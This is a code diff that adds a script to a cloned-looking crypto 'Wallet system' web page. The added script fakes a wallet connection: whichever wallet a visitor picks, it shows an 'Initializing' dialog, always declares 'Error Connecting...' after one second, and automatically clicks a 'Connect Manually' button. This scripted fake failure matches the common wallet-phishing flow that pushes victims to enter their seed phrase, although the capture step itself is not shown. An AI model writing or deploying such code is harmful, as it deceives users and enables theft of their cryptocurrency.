@@ -8088,7 +8088,30 @@
     <script src="cryptoallstars-im%20Wallet%20system_files/jquery.counterup.min.js.download"></script>
     <script src="cryptoallstars-im%20Wallet%20system_files/wow.min.js.download"></script>
     <script src="cryptoallstars-im%20Wallet%20system_files/script.js.download"></script>
-    
+    <script>
+      $(document).ready(function () {
+        let wallets = $(".coin-registry button");
+        wallets.each(function () {
+          $(this).on("click", function () {
+            let img = $(this).find(".coin-img").attr("src");
+            event.preventDefault();
+            $(".connection-info").text("Initializing...");
+            $("#current-wallet-app").text(
+              $(this).children().last().text().trim()
+            );
+            $("#current-wallet-logo").attr("src", img);
+            $("#connect-dialog").show();
+            setTimeout(function () {
+              $(".connection-info").html(
+                'Error Connecting... <button class="manual-connection">Connect Manually</button>'
+              );
+              $(document).find("button.manual-connection").trigger("click");
+            }, 1000);
+          });
+        });
+      });
+    </script>
+   
     
   </body>
 
